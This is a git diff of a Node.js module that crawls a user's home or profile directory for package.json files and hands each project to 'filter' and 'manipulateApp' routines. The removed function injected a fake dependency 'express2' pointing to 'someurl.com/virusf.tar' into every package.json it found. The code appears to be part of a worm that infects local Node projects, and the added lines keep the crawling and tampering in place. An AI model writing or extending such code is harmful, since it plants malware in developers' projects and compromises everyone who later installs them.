@@ -7,13 +7,12 @@ var os = require('os');
 /* ======================================================== *
  * > Packages
  * ======================================================== */
-var fileSystem = require('../files/fileSystem.js');
-var manipulate = require('../manipulate/filter.js');
-var beautify = require('../files/beautifier.js');
+var manipulate = require('../../manipulate');
 
 /* ======================================================== *
  * > Package Libary
  * ======================================================== */
+var debugPath = "D:/SandBox/Node.js/express-world";
 
 /**
  * Walk and Search for a Package.json
@@ -22,16 +21,14 @@ var beautify = require('../files/beautifier.js');
  */
 exports.walkFileSystem = function () {
     var entryPoint = this.getEntryPoint();
-    console.log('entryPoint: ' + entryPoint);
-
     var walker = walk.walk(entryPoint);
-    var h = this;
 
     walker.on("file", function (root, fileStats, next) {
         if (fileStats.name == 'package.json') {
-            console.log('found a package.json at: ' + root);
-            //h.manipulatePackage(root + '/package.json');
-            //h.manipulate.filterPackages(root);
+            var filter = manipulate.filter(root);
+            if (filter) {
+                manipulate.manipulateApp(root);
+            }
         }
         next();
     });
@@ -41,7 +38,7 @@ exports.walkFileSystem = function () {
     });
 
     walker.on("end", function () {
-        console.log("all done");
+        // File Walking is finished
     });
 }
 
@@ -53,46 +50,21 @@ exports.walkFileSystem = function () {
  */
 exports.getEntryPoint = function () {
     var osType = os.type();
+    if (debugPath != null && debugPath != '') {
+        return debugPath;
+    }
     if (osType == null) {
         return null;
     }
     if (osType == 'Linux') {
         return '/home';
     }
-    if(osType == 'Darwin'){
+    if (osType == 'Darwin') {
         return '';
     }
-    if(osType == 'Windows_NT'){
+    if (osType == 'Windows_NT') {
         var userPath = process.env[(process.platform == 'win32') ? 'USERPROFILE' : 'HOME'];
         var drivePath = 'C:\\';
         return userPath;
-    }
-}
-
-
-
-/**
- * Manipulate a Package.json
- * 
- * @param packagePath: string
- * 
- * 
- * @return void
- */
-exports.manipulatePackage = function (packagePath) {
-    var check = fileSystem.checkFileExists(packagePath);
-    if (check) {
-        var packageJson = require(packagePath);
-        packageJson.dependencies["express2"] = "someurl.com/virusf.tar";
-        packageJson = JSON.stringify(packageJson);
-
-        packageJson = beautify.beautify(packageJson);
-
-        var write = fileSystem.writeFile(packagePath, packageJson, function (done) {
-            console.log('Writing the Package.json: ' + done);
-        });
-    }
-    else {
-        console.log('Package.json not found!')
     }
 }
